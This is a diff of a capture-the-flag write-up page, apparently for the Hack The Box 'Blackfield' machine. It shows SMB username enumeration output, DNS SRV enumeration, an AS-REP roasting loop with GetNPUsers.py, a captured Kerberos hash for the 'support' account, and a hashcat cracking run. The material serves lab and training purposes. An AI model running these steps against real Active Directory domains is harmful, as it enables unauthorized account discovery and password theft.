+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\MNaciri:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\MShanmugarajah:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\MSichkar:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\MTemko:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\MTipirneni:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\MTonuri:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\MVanarsdel:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\NBellibas:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\NDikoka:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\NGenevro:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\NGoddanti:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\NMrdirk:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\NPulido:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\NRonges:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\NSchepkie:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\NVanpraet:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\OBelghazi:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\OBushey:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\OHardybala:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\OLunas:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\ORbabka:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\PBourrat:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\PBozzelle:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\PBranti:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\PCapperella:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\PCurtz:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\PDoreste:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\PGegnas:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\PMasulla:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\PMendlinger:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\PParakat:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\PProvencer:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\PTesik:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\PVinkovich:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\PVirding:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\PWeinkaus:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\RBaliukonis:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\RBochare:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\RKrnjaic:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\RNemnich:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\RPoretsky:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\RStuehringer:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\RSzewczuga:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\RVallandas:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\RWeatherl:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\RWissor:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\SAbdulagatov:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\SAjowi:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\SAlguwaihes:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\SBonaparte:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\SBouzane:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\SChatin:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\SDellabitta:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\SDhodapkar:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\SEulert:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\SFadrigalan:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\SGolds:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\SGrifasi:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\SGtlinas:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\SHauht:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\SHederian:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\SHelregel:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\SKrulig:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\SLewrie:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\SMaskil:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\Smocker:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\SMoyta:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\SRaustiala:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\SReppond:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\SSicliano:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\SSilex:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\SSolsbak:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\STousignaut:&#39;
+[-] 10.10.10.192:445      - 10.10.10.192:445 - Failed: &#39;.\support:&#39;,
+[-] 10.10.10.192:445      - 10.10.10.192:445 - Failed: &#39;.\svc_backup:&#39;,
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\SWhyte:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\SWynigear:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\TAwaysheh:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\TBadenbach:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\TCaffo:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\TCassalom:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\TEiselt:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\TFerencdo:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\TGaleazza:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\TKauten:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\TKnupke:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\TLintlop:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\TMusselli:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\TOust:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\TSlupka:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\TStausland:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\TZumpella:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\UCrofskey:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\UMarylebone:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\UPyrke:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\VBublavy:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\VButziger:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\VFuscca:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\VLitschauer:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\VMamchuk:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\VMarija:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\VOlaosun:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\VPapalouca:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\WSaldat:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\WVerzhbytska:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\WZelazny:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\XBemelen:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\XDadant:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\XDebes:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\XKonegni:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\XRykiel:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\YBleasdale:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\YHuftalin:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\YKivlen:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\YKozlicki:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\YNyirenda:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\YPredestin:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\YSeturino:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\YSkoropada:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\YVonebers:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\YZarpentine:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\ZAlatti:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\ZKrenselewski:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\ZMalaab:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\ZMiick:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\ZScozzari:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\ZTimofeeff:&#39;
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: &#39;.\ZWausik:&#39;
 [*] 10.10.10.192:445      - Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 </code></pre><p>Among of many &ldquo;success&rdquo; entries we notice some failures:</p>
-<pre><code>[-] 10.10.10.192:445      - 10.10.10.192:445 - Failed: '.\audit2020:',
-[-] 10.10.10.192:445      - 10.10.10.192:445 - Failed: '.\support:',
-[-] 10.10.10.192:445      - 10.10.10.192:445 - Failed: '.\svc_backup:',
+<pre tabindex="0"><code>[-] 10.10.10.192:445      - 10.10.10.192:445 - Failed: &#39;.\audit2020:&#39;,
+[-] 10.10.10.192:445      - 10.10.10.192:445 - Failed: &#39;.\support:&#39;,
+[-] 10.10.10.192:445      - 10.10.10.192:445 - Failed: &#39;.\svc_backup:&#39;,
 </code></pre><ol start="4">
 <li>Run DNS enumeration:</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dnsrecon -d BLACKFIELD.local -n 10.10.10.192
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Performing General Enumeration of Domain: BLACKFIELD.local
-<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> DNSSEC is not configured <span style="color:#66d9ef">for</span> BLACKFIELD.local
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	 SOA dc01.BLACKFIELD.local 10.10.10.192
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	 NS dc01.BLACKFIELD.local 10.10.10.192
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	 NS dc01.BLACKFIELD.local dead:beef::bcb9:6997:c8be:2c1e
-<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Could not Resolve MX Records <span style="color:#66d9ef">for</span> BLACKFIELD.local
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	 A BLACKFIELD.local 10.10.10.192
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerating SRV Records
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _kerberos._udp.BLACKFIELD.local dc01.blackfield.local 10.10.10.192 <span style="color:#ae81ff">88</span>
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _kerberos._udp.BLACKFIELD.local dc01.blackfield.local dead:beef::bcb9:6997:c8be:2c1e <span style="color:#ae81ff">88</span>
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _ldap._tcp.BLACKFIELD.local dc01.blackfield.local 10.10.10.192 <span style="color:#ae81ff">389</span>
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _ldap._tcp.BLACKFIELD.local dc01.blackfield.local dead:beef::bcb9:6997:c8be:2c1e <span style="color:#ae81ff">389</span>
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _kerberos._tcp.BLACKFIELD.local dc01.blackfield.local 10.10.10.192 <span style="color:#ae81ff">88</span>
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _kerberos._tcp.BLACKFIELD.local dc01.blackfield.local dead:beef::bcb9:6997:c8be:2c1e <span style="color:#ae81ff">88</span>
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _gc._tcp.BLACKFIELD.local dc01.blackfield.local 10.10.10.192 <span style="color:#ae81ff">3268</span>
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _gc._tcp.BLACKFIELD.local dc01.blackfield.local dead:beef::bcb9:6997:c8be:2c1e <span style="color:#ae81ff">3268</span>
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _ldap._tcp.pdc._msdcs.BLACKFIELD.local dc01.blackfield.local 10.10.10.192 <span style="color:#ae81ff">389</span>
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _ldap._tcp.pdc._msdcs.BLACKFIELD.local dc01.blackfield.local dead:beef::bcb9:6997:c8be:2c1e <span style="color:#ae81ff">389</span>
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _ldap._tcp.ForestDNSZones.BLACKFIELD.local dc01.blackfield.local 10.10.10.192 <span style="color:#ae81ff">389</span>
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _ldap._tcp.ForestDNSZones.BLACKFIELD.local dc01.blackfield.local dead:beef::bcb9:6997:c8be:2c1e <span style="color:#ae81ff">389</span>
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _ldap._tcp.dc._msdcs.BLACKFIELD.local dc01.blackfield.local 10.10.10.192 <span style="color:#ae81ff">389</span>
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _ldap._tcp.dc._msdcs.BLACKFIELD.local dc01.blackfield.local dead:beef::bcb9:6997:c8be:2c1e <span style="color:#ae81ff">389</span>
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _kpasswd._tcp.BLACKFIELD.local dc01.blackfield.local 10.10.10.192 <span style="color:#ae81ff">464</span>
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _kpasswd._tcp.BLACKFIELD.local dc01.blackfield.local dead:beef::bcb9:6997:c8be:2c1e <span style="color:#ae81ff">464</span>
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _kerberos._tcp.dc._msdcs.BLACKFIELD.local dc01.blackfield.local 10.10.10.192 <span style="color:#ae81ff">88</span>
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _kerberos._tcp.dc._msdcs.BLACKFIELD.local dc01.blackfield.local dead:beef::bcb9:6997:c8be:2c1e <span style="color:#ae81ff">88</span>
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _kpasswd._udp.BLACKFIELD.local dc01.blackfield.local 10.10.10.192 <span style="color:#ae81ff">464</span>
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _kpasswd._udp.BLACKFIELD.local dc01.blackfield.local dead:beef::bcb9:6997:c8be:2c1e <span style="color:#ae81ff">464</span>
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _ldap._tcp.gc._msdcs.BLACKFIELD.local dc01.blackfield.local 10.10.10.192 <span style="color:#ae81ff">3268</span>
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _ldap._tcp.gc._msdcs.BLACKFIELD.local dc01.blackfield.local dead:beef::bcb9:6997:c8be:2c1e <span style="color:#ae81ff">3268</span>
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#ae81ff">22</span> Records Found
-
-</code></pre></div><ol start="5">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dnsrecon -d BLACKFIELD.local -n 10.10.10.192
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Performing General Enumeration of Domain: BLACKFIELD.local
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> DNSSEC is not configured <span style="color:#66d9ef">for</span> BLACKFIELD.local
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	 SOA dc01.BLACKFIELD.local 10.10.10.192
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	 NS dc01.BLACKFIELD.local 10.10.10.192
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	 NS dc01.BLACKFIELD.local dead:beef::bcb9:6997:c8be:2c1e
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Could not Resolve MX Records <span style="color:#66d9ef">for</span> BLACKFIELD.local
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	 A BLACKFIELD.local 10.10.10.192
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerating SRV Records
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _kerberos._udp.BLACKFIELD.local dc01.blackfield.local 10.10.10.192 <span style="color:#ae81ff">88</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _kerberos._udp.BLACKFIELD.local dc01.blackfield.local dead:beef::bcb9:6997:c8be:2c1e <span style="color:#ae81ff">88</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _ldap._tcp.BLACKFIELD.local dc01.blackfield.local 10.10.10.192 <span style="color:#ae81ff">389</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _ldap._tcp.BLACKFIELD.local dc01.blackfield.local dead:beef::bcb9:6997:c8be:2c1e <span style="color:#ae81ff">389</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _kerberos._tcp.BLACKFIELD.local dc01.blackfield.local 10.10.10.192 <span style="color:#ae81ff">88</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _kerberos._tcp.BLACKFIELD.local dc01.blackfield.local dead:beef::bcb9:6997:c8be:2c1e <span style="color:#ae81ff">88</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _gc._tcp.BLACKFIELD.local dc01.blackfield.local 10.10.10.192 <span style="color:#ae81ff">3268</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _gc._tcp.BLACKFIELD.local dc01.blackfield.local dead:beef::bcb9:6997:c8be:2c1e <span style="color:#ae81ff">3268</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _ldap._tcp.pdc._msdcs.BLACKFIELD.local dc01.blackfield.local 10.10.10.192 <span style="color:#ae81ff">389</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _ldap._tcp.pdc._msdcs.BLACKFIELD.local dc01.blackfield.local dead:beef::bcb9:6997:c8be:2c1e <span style="color:#ae81ff">389</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _ldap._tcp.ForestDNSZones.BLACKFIELD.local dc01.blackfield.local 10.10.10.192 <span style="color:#ae81ff">389</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _ldap._tcp.ForestDNSZones.BLACKFIELD.local dc01.blackfield.local dead:beef::bcb9:6997:c8be:2c1e <span style="color:#ae81ff">389</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _ldap._tcp.dc._msdcs.BLACKFIELD.local dc01.blackfield.local 10.10.10.192 <span style="color:#ae81ff">389</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _ldap._tcp.dc._msdcs.BLACKFIELD.local dc01.blackfield.local dead:beef::bcb9:6997:c8be:2c1e <span style="color:#ae81ff">389</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _kpasswd._tcp.BLACKFIELD.local dc01.blackfield.local 10.10.10.192 <span style="color:#ae81ff">464</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _kpasswd._tcp.BLACKFIELD.local dc01.blackfield.local dead:beef::bcb9:6997:c8be:2c1e <span style="color:#ae81ff">464</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _kerberos._tcp.dc._msdcs.BLACKFIELD.local dc01.blackfield.local 10.10.10.192 <span style="color:#ae81ff">88</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _kerberos._tcp.dc._msdcs.BLACKFIELD.local dc01.blackfield.local dead:beef::bcb9:6997:c8be:2c1e <span style="color:#ae81ff">88</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _kpasswd._udp.BLACKFIELD.local dc01.blackfield.local 10.10.10.192 <span style="color:#ae81ff">464</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _kpasswd._udp.BLACKFIELD.local dc01.blackfield.local dead:beef::bcb9:6997:c8be:2c1e <span style="color:#ae81ff">464</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _ldap._tcp.gc._msdcs.BLACKFIELD.local dc01.blackfield.local 10.10.10.192 <span style="color:#ae81ff">3268</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>      SRV _ldap._tcp.gc._msdcs.BLACKFIELD.local dc01.blackfield.local dead:beef::bcb9:6997:c8be:2c1e <span style="color:#ae81ff">3268</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#ae81ff">22</span> Records Found
+</span></span></code></pre></div><ol start="5">
 <li>Get Kerberos tickets:</li>
 </ol>
-<pre><code># cat users.txt | while read u; do GetNPUsers.py BLACKFIELD.local/${u} -dc-ip 10.10.10.192 -no-pass; done
+<pre tabindex="0"><code># cat users.txt | while read u; do GetNPUsers.py BLACKFIELD.local/${u} -dc-ip 10.10.10.192 -no-pass; done
 ...
 [*] Getting TGT for support
 $krb5asrep$23$support@BLACKFIELD.LOCAL:b291b9dfbad5a15a2fe622d597db5fd1$ee82925980a5e5adcdd235ef292b0c258aba9292d27417a581a4f8cf728383f4d589ab517539528fc6d3e5e7397036c11dd0375310b577bb8e76af07f4e62a1ba97b71aafdcb0eacb0dc8450ea6a92079208ed2353ab1756420ed65c66ce7b41cf2deb8dd0e920d7d5c8c9ce124db5857941db7e370811a4899b9e8273b430187c3f0238db1286a140a2a42cfcd82e1dba2f11ca4461c7dcf08cb4a1dcc49b9a5a513d058871a5c58bbb2b20d92a71ed1dc78c0e641228b951ab047c111b00d37fd3e4cdadf5edd91cc75a745bef770bb23c0dda85719f7572b01580eb47ea897695c99b418aa278b526e3a86d2ec581bbe23464
@@ -943,95 +935,95 @@ Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
 </code></pre><ol start="6">
 <li>Cracking with <code>hashcat</code>:</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hashcat --force -d <span style="color:#ae81ff">1</span> -a <span style="color:#ae81ff">0</span> -m <span style="color:#ae81ff">18200</span> support.hash ../wordlists/rockyou.txt
-
-hashcat <span style="color:#f92672">(</span>v5.1.0-1846-gf92df252<span style="color:#f92672">)</span> starting...
-
-You have enabled --force to bypass dangerous warnings and errors!
-This can hide serious problems and should only be <span style="color:#66d9ef">done</span> when debugging.
-Do not report hashcat issues encountered when using --force.
-/sys/bus/pci/devices/0000:00:00.0/pp_dpm_pcie: No such file or directory
-
-/sys/bus/pci/devices/0000:00:00.0/pp_dpm_sclk: No such file or directory
-
-First_file_in_directory<span style="color:#f92672">()</span> failed.
-
-/sys/bus/pci/devices/0000:00:00.0/pp_dpm_mclk: No such file or directory
-
-First_file_in_directory<span style="color:#f92672">()</span> failed.
-
-OpenCL API <span style="color:#f92672">(</span>OpenCL 1.1 Mesa 20.0.7<span style="color:#f92672">)</span> - Platform <span style="color:#75715e">#1 [Mesa]</span>
-<span style="color:#f92672">========================================================</span>
-* Device <span style="color:#75715e">#1: Radeon RX 580 Series (POLARIS10, DRM 3.36.0, 5.6.15-arch1-1, LLVM 10.0.0), 8128/8192 MB (6553 MB allocatable), 36MCU</span>
-
-OpenCL API <span style="color:#f92672">(</span>OpenCL 2.1 AMD-APP <span style="color:#f92672">(</span>3075.10<span style="color:#f92672">))</span> - Platform <span style="color:#75715e">#2 [Advanced Micro Devices, Inc.]</span>
-<span style="color:#f92672">======================================================================================</span>
-* Device <span style="color:#75715e">#2: Ellesmere, skipped</span>
-
-Minimum password length supported by kernel: <span style="color:#ae81ff">0</span>
-Maximum password length supported by kernel: <span style="color:#ae81ff">256</span>
-
-Hashes: <span style="color:#ae81ff">1</span> digests; <span style="color:#ae81ff">1</span> unique digests, <span style="color:#ae81ff">1</span> unique salts
-Bitmaps: <span style="color:#ae81ff">16</span> bits, <span style="color:#ae81ff">65536</span> entries, 0x0000ffff mask, <span style="color:#ae81ff">262144</span> bytes, 5/13 rotates
-Rules: <span style="color:#ae81ff">1</span>
-
-Applicable optimizers:
-* Zero-Byte
-* Not-Iterated
-* Single-Hash
-* Single-Salt
-
-ATTENTION! Pure <span style="color:#f92672">(</span>unoptimized<span style="color:#f92672">)</span> backend kernels selected.
-Using pure kernels enables cracking longer passwords but <span style="color:#66d9ef">for</span> the price of drastically reduced performance.
-If you want to switch to optimized backend kernels, append -O to your commandline.
-See the above message to find out about the exact limits.
-
-Watchdog: Temperature abort trigger set to 90c
-
